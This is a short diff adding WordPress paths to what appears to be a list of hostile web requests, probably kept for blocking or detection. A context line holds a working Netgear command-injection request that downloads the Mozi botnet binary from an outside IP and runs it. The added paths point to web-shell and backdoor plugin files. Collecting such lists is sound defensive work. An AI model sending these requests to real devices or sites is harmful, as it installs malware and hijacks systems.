@@ -11158,3 +11158,7 @@ http://www.ip138.com/
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.138.181.246:33248/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /?gad_source=5&gclid=Cj0KCQiA-aK8BhCDARIsAL_-H9lbLACGWr1PLlgod4CfnAokS71nkhFPZsoKAinKHFDsQegmJgeJ8rYaAu_LEALw_wcB
 /.well-known/acme-challenge/*.php
+/wp-includes/blocks/page-list/page-list/index.php
+/wp-content/plugins/royal-ckeditor/admin.php
+/wp-content/plugins/ioxi/retu.php
+/wp-content/plugins/vwcleanerplugin/bump.php?cache
